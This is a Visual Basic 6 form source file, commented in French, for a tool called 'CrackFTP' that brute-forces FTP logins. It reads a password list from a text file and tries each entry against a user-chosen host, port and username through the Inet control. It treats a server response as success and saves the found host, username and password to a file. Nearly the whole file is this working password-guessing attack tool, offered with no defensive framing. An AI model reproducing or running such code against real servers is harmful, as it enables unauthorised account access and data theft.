VERSION 5.00
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "CrackFTP"
   ClientHeight    =   4590
   ClientLeft      =   3570
   ClientTop       =   3525
   ClientWidth     =   4605
   FillColor       =   &H80000000&
   ForeColor       =   &H80000000&
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4590
   ScaleWidth      =   4605
   Begin VB.Timer Timer2 
      Enabled         =   0   'False
      Interval        =   500
      Left            =   5520
      Top             =   1560
   End
   Begin VB.TextBox Text1 
      Alignment       =   2  'Center
      BackColor       =   &H00C0FFFF&
      Height          =   285
      Left            =   2400
      TabIndex        =   27
      Text            =   "21"
      Top             =   240
      Width           =   855
   End
   Begin VB.CommandButton Command6 
      Height          =   550
      Left            =   2760
      Picture         =   "CrackFTP.frx":0000
      Style           =   1  'Graphical
      TabIndex        =   25
      ToolTipText     =   "Enregistrer le mot de passe"
      Top             =   1200
      Visible         =   0   'False
      Width           =   550
   End
   Begin VB.CommandButton Command3 
      DisabledPicture =   "CrackFTP.frx":08CA
      Enabled         =   0   'False
      Height          =   550
      Left            =   3360
      Picture         =   "CrackFTP.frx":0ADB
      Style           =   1  'Graphical
      TabIndex        =   24
      ToolTipText     =   "Commencer la recherche"
      Top             =   600
      Width           =   550
   End
   Begin VB.CommandButton Command5 
      Default         =   -1  'True
      Height          =   495
      Left            =   3360
      Picture         =   "CrackFTP.frx":0DE5
      Style           =   1  'Graphical
      TabIndex        =   22
      ToolTipText     =   "Réduire la fenêtre du programme"
      Top             =   0
      Width           =   495
   End
   Begin VB.CommandButton Command1 
      Height          =   495
      Left            =   4000
      Picture         =   "CrackFTP.frx":10EF
      Style           =   1  'Graphical
      TabIndex        =   21
      ToolTipText     =   "Fermer le programme"
      Top             =   0
      Width           =   495
   End
   Begin VB.TextBox Text5 
      BackColor       =   &H00C0FFFF&
      Height          =   285
      HideSelection   =   0   'False
      Left            =   0
      TabIndex        =   19
      Top             =   240
      Width           =   2295
   End
   Begin VB.TextBox Text4 
      BackColor       =   &H00E0E0E0&
      Height          =   2055
      HideSelection   =   0   'False
      Left            =   0
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      TabIndex        =   17
      ToolTipText     =   "Liste de tous les mots de passe testé"
      Top             =   2160
      Width           =   1935
   End
   Begin MSComDlg.CommonDialog CMD 
      Left            =   5520
      Top             =   1080
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.Frame Frame2 
      Caption         =   "Informations"
      Height          =   2055
      Left            =   2040
      TabIndex        =   8
      Top             =   2160
      Width           =   2535
      Begin MSComctlLib.ProgressBar ProgressBar2 
         Height          =   1695
         Left            =   2040
         TabIndex        =   23
         ToolTipText     =   "Progression Total"
         Top             =   240
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   2990
         _Version        =   393216
         Appearance      =   1
         Min             =   1e-4
         Orientation     =   1
         Scrolling       =   1
      End
      Begin VB.Label Label12 
         Alignment       =   2  'Center
         BackColor       =   &H008080FF&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "0"
         Height          =   255
         Left            =   0
         TabIndex        =   16
         Top             =   480
         Width           =   2055
      End
      Begin VB.Label Label11 
         Alignment       =   2  'Center
         BackColor       =   &H008080FF&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Aucun Mot de Passe Testé"
         Height          =   255
         Left            =   0
         TabIndex        =   15
         Top             =   1680
         Width           =   2055
      End
      Begin VB.Label Label10 
         Alignment       =   2  'Center
         BackColor       =   &H00C0C0C0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Mot de Passe Testé"
         Height          =   255
         Left            =   0
         TabIndex        =   14
         Top             =   1440
         Width           =   2055
      End
      Begin VB.Label Label9 
         Alignment       =   2  'Center
         BackColor       =   &H008080FF&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "0"
         Height          =   255
         Left            =   0
         TabIndex        =   11
         Top             =   1080
         Width           =   2055
      End
      Begin VB.Label Label8 
         Alignment       =   2  'Center
         BackColor       =   &H00C0C0C0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Nombre de mots de Passe"
         Height          =   255
         Left            =   0
         TabIndex        =   10
         Top             =   840
         Width           =   2055
      End
      Begin VB.Label Label7 
         Alignment       =   2  'Center
         BackColor       =   &H00C0C0C0&
         BorderStyle     =   1  'Fixed Single
         Caption         =   "Temps Estimé Restant (s)"
         Height          =   255
         Left            =   0
         TabIndex        =   9
         Top             =   240
         Width           =   2055
      End
   End
   Begin VB.Frame Frame1 
      Caption         =   "Choix du fichier Texte"
      Height          =   915
      Left            =   0
      TabIndex        =   7
      Top             =   1200
      Width           =   2415
      Begin VB.TextBox Text3 
         BackColor       =   &H00C0FFFF&
         Height          =   285
         HideSelection   =   0   'False
         Left            =   120
         TabIndex        =   13
         Top             =   480
         Width           =   1575
      End
      Begin VB.CommandButton Command4 
         Height          =   550
         Left            =   1800
         Picture         =   "CrackFTP.frx":19B9
         Style           =   1  'Graphical
         TabIndex        =   12
         ToolTipText     =   "Parcourir. Chercher le fichier texte qui contiendera les mots de passe"
         Top             =   240
         Width           =   550
      End
   End
   Begin VB.TextBox Text2 
      BackColor       =   &H00C0FFFF&
      Height          =   285
      HideSelection   =   0   'False
      Left            =   0
      TabIndex        =   3
      Top             =   840
      Width           =   1575
   End
   Begin VB.CommandButton Command2 
      DisabledPicture =   "CrackFTP.frx":2283
      Enabled         =   0   'False
      Height          =   550
      Left            =   3960
      Picture         =   "CrackFTP.frx":24FD
      Style           =   1  'Graphical
      TabIndex        =   1
      ToolTipText     =   "Arréter la recherche"
      Top             =   600
      Width           =   550
   End
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Interval        =   2000
      Left            =   5520
      Top             =   600
   End
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   5400
      Top             =   0
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
      Protocol        =   2
      RemotePort      =   200
      URL             =   "ftp://"
      RequestTimeout  =   30
   End
   Begin VB.Label Label14 
      Alignment       =   2  'Center
      BackColor       =   &H00C0C0C0&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Port"
      Height          =   255
      Left            =   2400
      TabIndex        =   26
      Top             =   0
      Width           =   855
   End
   Begin VB.Image Image1 
      Height          =   960
      Left            =   3480
      Picture         =   "CrackFTP.frx":2807
      Top             =   1200
      Width           =   960
   End
   Begin VB.Label Label13 
      Alignment       =   2  'Center
      BackColor       =   &H00E0E0E0&
      BorderStyle     =   1  'Fixed Single
      Height          =   285
      Left            =   0
      TabIndex        =   20
      Top             =   240
      Visible         =   0   'False
      Width           =   2295
   End
   Begin VB.Label Label2 
      Alignment       =   2  'Center
      BackColor       =   &H00C0C0C0&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Adresse FTP"
      Height          =   255
      Left            =   0
      TabIndex        =   18
      Top             =   0
      Width           =   2295
   End
   Begin VB.Label Label6 
      Alignment       =   2  'Center
      BackColor       =   &H00E0E0E0&
      BorderStyle     =   1  'Fixed Single
      Height          =   255
      Left            =   0
      TabIndex        =   6
      Top             =   840
      Visible         =   0   'False
      Width           =   1575
   End
   Begin VB.Label Label5 
      Alignment       =   2  'Center
      BackColor       =   &H00E0E0E0&
      BorderStyle     =   1  'Fixed Single
      Height          =   285
      Left            =   1680
      TabIndex        =   5
      Top             =   840
      Width           =   1575
   End
   Begin VB.Label Label4 
      Alignment       =   2  'Center
      BackColor       =   &H00C0C0C0&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Nom Utilisateur"
      Height          =   255
      Left            =   0
      TabIndex        =   4
      Top             =   600
      Width           =   1575
   End
   Begin VB.Label Label3 
      Alignment       =   2  'Center
      BackColor       =   &H00C0C0C0&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Password"
      Height          =   255
      Left            =   1680
      TabIndex        =   2
      Top             =   600
      Width           =   1575
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      BackColor       =   &H00C0C0C0&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Aucun Teste en cours"
      Height          =   285
      Left            =   0
      TabIndex        =   0
      ToolTipText     =   "Etat de la progression de chaque mot de passe"
      Top             =   4275
      Width           =   4575
   End
   Begin VB.Menu Quitter 
      Caption         =   "Quitter"
   End
   Begin VB.Menu Fenêtre 
      Caption         =   "Fenêtre"
      Begin VB.Menu Normal 
         Caption         =   "Normal"
      End
      Begin VB.Menu Réduire 
         Caption         =   "Réduire"
      End
   End
   Begin VB.Menu Aide 
      Caption         =   "?"
      Begin VB.Menu Propos 
         Caption         =   "A Propos de"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Integer, ByVal lParam As Any) As Long

Dim ErreurFichier As Boolean
Dim Pass(1000000) As String
Dim MaxNbe As Long
Dim Nbe As Long
Dim Completed As Boolean
Dim Etat As Integer
Dim Time As Long
Dim strFtp As String
Private Sub Command1_Click()
End
End Sub

Private Sub Command2_Click()
FinDeConnection
Etat = 0

End Sub

Private Sub Command3_Click()

''''''''''''''''''''''''''''''''''''''''
'''''' Exécution de la recherche '''''''
''''''''''''''''''''''''''''''''''''''''

Dim User As String



ErreurFichier = False


'Apelle la fonction OuvrirFichier pour récupérer les mots de passes
Call OuvrirFichier(Text3.Text)

'Teste les erreurs possibles et renvoie un msgbox et un ext sub si il y en a une
If ErreurFichier = True Then
    MsgBox "Impossible d'ouvrir le fichier!Veuillez vérifier si le chemin d'accés est correcte ou si le fichier n'est pas actuellement utilisé.", vbExclamation, "Erreur dans CrackFTP"
    Text3.SelStart = 0
    Text3.SelLength = Len(Text3.Text)
    Text3.SetFocus
    Exit Sub
End If

If MaxNbe = 0 Then
    MsgBox "Le fichier texte est vide", vbExclamation, "Erreur dans CrackFTP"
    Text3.SelStart = 0
    Text3.SelLength = Len(Text3.Text)
    Exit Sub
End If



Call Bouton_On

'initialise les variables
Nbe = 0
Text4.Text = ""
ProgressBar2.Max = MaxNbe
Completed = 0
Time = 0
User = Text2.Text
strFtp = Text5.Text
Label13.Caption = strFtp
Label6.Caption = User
Inet1.RemotePort = Text1.Text
Timer1.Enabled = True
Label1.BackColor = &HC0C0C0
Label1.Caption = "Recherche en cours ..."


'Commence la recherche du mot de passe jusqu'ace que la valeur de completed soit à True

On Error GoTo Erreur

While Completed = False
DoEvents

    With Inet1
        .URL = strFtp
        .UserName = User
        .Password = Pass(Nbe)
        .OpenURL
    End With

Wend

GoTo Suite

Erreur:
MsgBox "Le serveur ftp ne répond pas", vbExclamation, "Erreur dans CrackFTP"

Suite:
Inet1.Cancel
Call FinDeTeste(Etat)




'si le mot de passe n'a pas était trouvé réinitialisation des controls
If Label5 = "" Then Call Bouton_Off

    

End Sub

Private Sub Command4_Click()
On Error GoTo Erreur
'Ouverture d'une boîte de dialogue pour choisir le fichier texte contenant la liste des mots de passes

CMD.DialogTitle = "Choisissez un fichier"
CMD.CancelError = True
CMD.Filter = "Texte (*.txt)|*.txt"
CMD.FilterIndex = 1
CMD.InitDir = App.Path
CMD.ShowOpen

'renvoie le nom du fichier dans le Text3
Text3.Text = CMD.FileName




Erreur:




End Sub

Private Sub Command5_Click()
'Réduit ou augemente la taille de la fenêtre suivant son état
If Form1.Width = 2625 Then
    Reduit_Off
Else
    Reduit_On
End If

End Sub

Private Sub Command6_Click()
On Error GoTo Erreur
CMD.DialogTitle = "Enregistrer les paramètres sous ..."
CMD.CancelError = True
CMD.Filter = "Texte (*.txt)|*.txt"
CMD.FilterIndex = 1
CMD.InitDir = App.Path
CMD.FileName = "Password" & Label6.Caption
CMD.ShowSave
 
On Error GoTo Erreur2
Open CMD.FileName For Output As #1
    Print #1, "Adresse FTP:" & Label13.Caption
    Print #1, "Nom d'utilisateur:" & Label6.Caption
    Print #1, "Mot de Passe:" & Label5.Caption
Close #1

Exit Sub

Erreur:
Exit Sub

Erreur2:
MsgBox "Une erreur est survenue au cours de l'enregistrement", vbExclamation, "Erreur dans CrackFTP"

End Sub

Private Sub Form_Load()


'initialise les variables
Completed = True

Frame1.Visible = True


    
    
'Change la couleur du progressbar en rouge
SendMessage ProgressBar2.hwnd, PBM_SETBARCOLOR, 0, ByVal vbRed



Form1.Show
'Met le curseur dans le Text5
Text5.SetFocus


End Sub

Private Sub Form_Unload(Cancel As Integer)

End

End Sub

Private Sub Inet1_StateChanged(ByVal State As Integer)
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
''''''' Analyse des différents états de la connections '''''''
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

'agit seulement si le teste est toujours en cours
If Completed = False Then


'Cette événement intervient lorsque l'etat de la connection avec le control inet change
'Un nombre est renvoyé dans la variable state pour nous indiqué cet Etat
'ici seul deux de ces états sont utilsés
'sachez qu'il en existe 12 dont voici les caractéristiques :
'
'icNone 0 No state to report.
'icHostResolvingHost 1 The control is looking up the IP address of the specified host computer.
'icHostResolved 2 The control successfully found the IP address of the specified host computer.
'icConnecting 3 The control is connecting to the host computer.
'icConnected 4 The control successfully connected to the host computer.
'icRequesting 5 The control is sending a request to the host computer.
'icRequestSent 6 The control successfully sent the request.
'icReceivingResponse 7 The control is receiving a response from the host computer.
'icResponseReceived 8 The control successfully received a response from the host computer.
'icDisconnecting 9 The control is disconnecting from the host computer.
'icDisconnected 10 The control successfully disconnected from the host computer.
'icError 11 An error occurred in communicating with the host computer.
'icResponseCompleted  12  The request has completed and all data has been received.

'''''''Ces sources sont tirés de l'aide en ligne MSDN'''''''

Select Case State
    
    
    
    Case 8
        
        'si une réponse est reçu cela signifie que le mot de passe à été trouvé
        Call FinDeConnection
        Etat = 2
        Label5.Caption = Pass(Nbe)
        Label6.Visible = True
        Text2.Visible = False
        Label13.Visible = True
        Text5.Visible = False
        Timer1.Enabled = False
        Command2.Enabled = False
        Command6.Visible = True
        Command6.Default = True
        Label1.Caption = "Le mot de passe a été trouvé"
        Call Reduit_Off
    
    
    
    Case 11
        'en revanche si il'y a une erreur cela signifie que le mot de passe n'est pas le bon
        'ce qui entraîne incrémentation du mot de passe et  tout le bazar
        
        
        Nbe = Nbe + 1
        If Nbe - 1 = MaxNbe Then
            FinDeConnection
            Etat = 1
            
        Else
           
   
            Text4.Text = Text4.Text & Pass(Nbe) & vbCrLf
            Text4.SelStart = Len(Text4.Text) - 1
            Label9.Caption = (Nbe) & "/" & (MaxNbe)
            Label11.Caption = Pass(Nbe)
            ProgressBar2.Value = Nbe
        End If
    
        
End Select

End If

End Sub

Private Sub Normal_Click()
Reduit_Off
End Sub

Private Sub Propos_Click()
frmAbout.Show
End Sub

Private Sub Quitter_Click()
End

End Sub

Private Sub Réduire_Click()
Reduit_On
End Sub

Private Sub Text1_Change()
'oblige la personne à mettre un nombre
If IsNumeric(Text1.Text) = False And Text1.Text <> "" Then
    MsgBox "Vous devez saisir un nombre", vbExclamation, "Erreur dans CrackFTP"
    Text1.Text = ""
End If

'Teste si les champs indispensable pour lancer le programme sont vide ou non
If Text2.Text <> "" And Text5.Text <> "" And Text3.Text <> "" And Text1.Text <> "" Then
    Command3.Enabled = True
    Command3.Default = True
Else
    Command3.Enabled = False
    Command3.Default = False
End If
End Sub

Private Sub Text2_Change()
'Teste si les champs indispensable pour lancer le programme sont vide ou non
If Text2.Text <> "" And Text5.Text <> "" And Text3.Text <> "" And Text1.Text <> "" Then
    Command3.Enabled = True
    Command3.Default = True
Else
    Command3.Enabled = False
    Command3.Default = False
End If


End Sub

Private Sub Text3_Change()

'Teste si les champs indispensable pour lancer le programme sont vide ou non
If Text2.Text <> "" And Text5.Text <> "" And Text3.Text <> "" And Text1.Text <> "" Then
    Command3.Enabled = True
    Command3.Default = True
Else
    Command3.Enabled = False
    Command3.Default = False
End If
End Sub


Private Sub Text5_Change()


'Teste si les champs indispensable pour lancer le programme sont vide ou non
If Text2.Text <> "" And Text5.Text <> "" And Text3.Text <> "" And Text1.Text <> "" Then
    Command3.Enabled = True
    Command3.Default = True
Else
    Command3.Enabled = False
    Command3.Default = False
End If
End Sub

Private Sub Timer1_Timer()
'Renvoie le temps éstimé
Time = Time + 2
Label12.Caption = (Int((Nbe / Time) * ((MaxNbe) - Nbe)))
End Sub

Sub OuvrirFichier(Fichier As String)
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'''''''' Stockage des mots de passes dans la variable Pass() ''''''''
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''



Dim i As Long
i = 1

On Error GoTo Erreur



Pass(0) = "zéro"

Open Fichier For Input As #1
Do While Not EOF(1)
    Line Input #1, Pass(i)
    i = i + 1

Loop
Close #1


MaxNbe = i - 1




Exit Sub


Erreur:

ErreurFichier = True


End Sub

Sub FinDeTeste(Etat As Integer)

'Fin du teste


'redonne la taille initial à la fénêtre
Call Reduit_Off

'selon la nature de la fin du teste indiqué par la variable Etat le controle label1 prend différentes formes
Select Case Etat
 
    Case 0
        Label1.Caption = "Interrompu"
        Label1.BackColor = &H80C0FF
    Case 1
        Label1.Caption = "Fin"
        Label1.BackColor = &H80C0FF
    Case 2
        Label1.Caption = "Le mot de passe a été trouvé"
        Label1.BackColor = &H80FF&
        Timer2.Enabled = True
End Select





    






End Sub

Sub Bouton_Off()
'Etat des boutons lorsque  le teste est inactif
Command3.Enabled = True
Command2.Enabled = False
Frame1.Enabled = True
Text2.Enabled = True
Text5.Enabled = True
Text1.Enabled = True
Timer1.Enabled = False


End Sub
Sub Bouton_On()
'Etat des boutons lorsque le Teste est actif
Command2.Enabled = True
Command3.Enabled = False
Frame1.Enabled = False
Text2.Enabled = False
Text5.Enabled = False
Text1.Enabled = False

End Sub
Sub FinDeConnection()
'arrète la boucle et don c la recherche en donnant la valeur true a completed
Completed = True
Inet1.Cancel
End Sub

Sub Reduit_On()
'Taille réduite de la fenêtre
Command5.ToolTipText = "Rendre la taille normal à la fenêtre du programme"

With Form1
    .Width = 2625
    .Height = 3795
End With
With Command3
    .Top = 0
    .Left = 0
End With
With Command2
    .Top = 0
    .Left = 720
End With
With Command1
    .Top = 50
    .Left = 1440
End With
With Command5
    .Top = 50
    .Left = 2040
End With
With Frame2
    .Top = 600
    .Left = 0
End With
With Label1
    .Width = 2535
    .Top = 2700
End With


Label2.Visible = False
Label3.Visible = False
Label4.Visible = False
Label14.Visible = False
Text4.Visible = False


Label5.Left = 2760
Label6.Left = 2760
Label13.Left = 2760

Frame1.Visible = False

Text2.Left = 2760
Text5.Left = 2760
Text1.Left = 2760

Image1.Visible = False


End Sub

Sub Reduit_Off()
Command5.ToolTipText = "Réduire la fenêtre du programme"
'Taille initial de la fenêtre

With Form1
    .Width = 4665
    .Height = 5370
End With
With Command3
    .Top = 600
    .Left = 3360
End With
With Command2
    .Top = 600
    .Left = 3960
End With
With Command1
    .Top = 0
    .Left = 4000
End With
With Command5
    .Top = 0
    .Left = 3360
End With
With Frame2
    .Top = 2160
    .Left = 2040
End With
With Label1
    .Width = 4575
    .Top = 4275
End With


Label2.Visible = True
Label3.Visible = True
Label4.Visible = True
Label14.Visible = True
Text4.Visible = True


Label5.Left = 1680
Label6.Left = 0
Label13.Left = 0

Frame1.Visible = True

Text1.Left = 2400
Text2.Left = 0
Text5.Left = 0

Image1.Visible = True

End Sub

Private Sub Timer2_Timer()
'Ca c'est juste pour le fun ça change la couleur du label1 toute les 500 ms lorsque le mot de passe est trouvé
If Label1.BackColor = &H80FF& Then
    Label1.BackColor = &H80FFFF
Else
    Label1.BackColor = &H80FF&
End If
End Sub
